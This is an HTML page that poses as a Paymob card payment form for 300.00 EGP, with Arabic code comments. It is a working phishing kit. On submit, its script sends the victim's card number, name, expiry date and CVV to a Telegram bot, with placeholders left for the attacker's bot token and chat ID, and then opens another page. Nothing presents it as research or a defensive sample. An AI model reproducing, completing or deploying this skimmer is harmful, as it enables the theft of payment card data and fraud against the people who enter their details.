<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Information</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            width: 360px;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .card-image {
            width: 100%;
            border-radius: 12px;
            margin-bottom: 15px;
        }

        h2 {
            font-size: 18px;
            margin-bottom: 10px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 14px;
            text-align: left;
            transition: border 0.3s;
        }

        input:focus {
            outline: 2px solid #007bff;
        }

        .input-row {
            display: flex;
            justify-content: space-between;
        }

        .input-row input {
            width: 47%;
            border-radius: 10px;
        }

        .expiry {
            margin-right: 6px;
        }

        .save-card {
            display: flex;
            align-items: center;
            margin: 12px 0;
            font-size: 14px;
        }

        .save-card input {
            width: auto;
            margin-right: 8px;
        }

        .pay-button {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }

        .pay-button:hover {
            background: #0056b3;
        }

        .secured {
            font-size: 12px;
            color: #777;
            margin-top: 10px;
        }

        /* لون أحمر عند الخطأ */
        .error {
            border: 2px solid red !important;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Payment Information</h2>
        <img src="https://i.imgur.com/ZR6p2ie.png" class="card-image" alt="Credit Card">
        
        <form id="paymentForm">
            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
            <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
            
            <div class="input-row">
                <input type="text" id="expiryDate" class="expiry" placeholder="MM/YY" maxlength="5" required>
                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d*" required>
            </div>

            <div class="save-card">
                <input type="checkbox" id="saveCard">
                <label for="saveCard">Save Card</label>
            </div>

            <button type="submit" class="pay-button">PAY 300.00 EGP</button>
        </form>

        <p class="secured">🔒 Secured by Paymob</p>
    </div>

    <script>
        const BOT_TOKEN = "YOUR_BOT_TOKEN";  
        const CHAT_ID = "YOUR_CHAT_ID";      

        // تنسيق رقم البطاقة: إضافة مسافة كل 4 أرقام
        document.getElementById("cardNumber").addEventListener("input", function(event) {
            let value = event.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
            event.target.value = formattedValue;
        });

        // ضبط تاريخ الانتهاء وإضافة "/"
        document.getElementById("expiryDate").addEventListener("input", function(event) {
            let value = event.target.value.replace(/\D/g, ''); 
            if (value.length >= 2) {
                let mm = parseInt(value.substring(0, 2), 10);
                let yy = parseInt(value.substring(2, 4), 10);

                // ضبط الحدود القصوى والدنيا
                if (mm < 1) mm = 1;
                if (mm > 12) mm = 12;
                if (yy < 25) yy = 25;
                if (yy > 40) yy = 40;
                if (yy === 25 && mm < 2) mm = 2;

                event.target.value = mm.toString().padStart(2, '0') + "/" + yy.toString().padStart(2, '0');
            }
        });

        document.getElementById("paymentForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const cardNumber = document.getElementById("cardNumber");
            const cardHolder = document.getElementById("cardHolder");
            const expiryDate = document.getElementById("expiryDate");
            const cvv = document.getElementById("cvv");
            const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";

            let valid = true;

            // التحقق من الإدخالات وتلوين الحقول بالأحمر عند الخطأ
            if (cardNumber.value.replace(/\s/g, '').length !== 16) {
                cardNumber.classList.add("error");
                valid = false;
            } else {
                cardNumber.classList.remove("error");
            }

            if (!/^[A-Za-z ]+$/.test(cardHolder.value)) {
                cardHolder.classList.add("error");
                valid = false;
            } else {
                cardHolder.classList.remove("error");
            }

            let [mm, yy] = expiryDate.value.split("/");
            if (!expiryDate.value.includes("/") || mm < 2 || yy < 25 || yy > 40) {
                expiryDate.classList.add("error");
                valid = false;
            } else {
                expiryDate.classList.remove("error");
            }

            if (!/^\d{3}$/.test(cvv.value)) {
                cvv.classList.add("error");
                valid = false;
            } else {
                cvv.classList.remove("error");
            }

            if (!valid) return;

            const message = `
                💳 *Payment Details* 💳
                ----------------------------
                👤 Name: ${cardHolder.value}
                💳 Card Number: ${cardNumber.value}
                📅 Expiry: ${expiryDate.value}
                🔒 CVV: ${cvv.value}
                💾 Save Card: ${saveCard}
            `;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            })
            .then(() => window.open("page.html", "_blank"));
        });
    </script>

</body>
</html>
